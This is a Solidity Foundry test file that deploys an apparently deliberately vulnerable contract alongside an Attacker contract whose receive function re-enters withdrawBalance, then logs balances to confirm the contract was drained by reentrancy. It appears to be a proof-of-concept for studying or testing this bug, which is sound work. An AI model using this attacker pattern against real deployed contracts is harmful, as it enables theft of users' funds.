// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/reentrancy_insecure.sol";

contract ReentrancyTest is Test {
    Reentrancy_insecure public insecureContract;
    Attacker public attacker;

    function setUp() public {
        insecureContract = new Reentrancy_insecure();
        attacker = new Attacker(insecureContract);
        deal(address(attacker), 1 ether);  // Fund attacker contract
    }

    function testReentrancyAttack() public {
        // Test contract makes deposit
        deal(address(this), 1 ether);
        insecureContract.deposit{value: 1 ether}();

        // Attacker deposits using its own balance
        attacker.deposit();

        // Record initial balances for differential verification
        uint256 preAttackContractETH = address(insecureContract).balance;
        uint256 preAttackAttackerInternal = insecureContract.getBalance(address(attacker));
        uint256 preAttackAttackerETH = address(attacker).balance;

        console2.log("--- BEFORE-Trigger Attack ---");
        console2.log("Contract ETH: %s", preAttackContractETH);
        console2.log("Attacker Internal Balance: %s", preAttackAttackerInternal);
        console2.log("Attacker ETH: %s", preAttackAttackerETH);
        
        console2.log("--- Trigger Attack ---");
        // Execute attack
        attacker.attack();
        
        console2.log("--- AFTER-Trigger Attack ---");
        uint256 postAttackContractETH = address(insecureContract).balance;
        uint256 postAttackAttackerInternal = insecureContract.getBalance(address(attacker));
        uint256 postAttackAttackerETH = address(attacker).balance;
        console2.log("Contract ETH: %s", postAttackContractETH);
        console2.log("Attacker Internal Balance: %s", postAttackAttackerInternal);
        console2.log("Attacker ETH: %s", postAttackAttackerETH);

        // Calculate state changes
        uint256 contractLoss = preAttackContractETH - postAttackContractETH;
        uint256 attackerGain = postAttackAttackerETH - preAttackAttackerETH;
        uint256 attackerInternalChange = preAttackAttackerInternal - postAttackAttackerInternal;

        console2.log("Contract Loss: %s", contractLoss);
        console2.log("Attacker Gain: %s", attackerGain);
        console2.log("Attacker Internal Change: %s", attackerInternalChange);

        // Final vulnerability verdict
        bool vulnerabilityExists = (contractLoss == 2 ether) &&
                                   (attackerGain == 2 ether) &&
                                   (postAttackAttackerInternal == 0);

        if (vulnerabilityExists) {
            console2.log("Vulnerability Exists: Attacker successfully drained contract via reentrancy");
        } else {
            console2.log("Vulnerability not Exist: Attack failed to execute properly");
        }
    }

    // Allow test contract to receive ether
    receive() external payable {}
}

contract Attacker {
    Reentrancy_insecure public target;
    bool private attackPhase;

    constructor(Reentrancy_insecure _target) {
        target = _target;
        attackPhase = false;
    }

    function deposit() public {
        uint256 amount = address(this).balance;
        target.deposit{value: amount}();
    }

    function attack() public {
        attackPhase = true;
        target.withdrawBalance();
        attackPhase = false;
    }

    // Malicious receive function for reentrancy
    receive() external payable {
        // Only attack during active attack phase
        if (attackPhase) {
            attackPhase = false;  // Prevent recursion issues
            target.withdrawBalance();
        }
    }
}